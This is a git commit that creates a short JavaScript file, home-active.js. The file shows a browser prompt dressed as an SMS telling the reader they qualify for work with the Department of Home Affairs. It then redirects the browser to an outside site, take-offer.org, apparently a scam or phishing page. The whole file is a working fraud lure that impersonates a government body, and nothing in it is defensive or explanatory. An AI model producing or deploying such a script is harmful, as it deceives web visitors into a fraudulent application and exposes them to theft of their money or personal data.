3ea5ed8b5f3ed8fbd2c82aca8ee784b8945ee980
derealblog <rosie1999willie@gmail.com>
2025-03-12 19:55:03 +0100

    Create home-active.js

---
+++ home-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the Department of Home Affairs, Kindly Press OK to submit application   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://take-offer.org/home-affaire.html';
+}
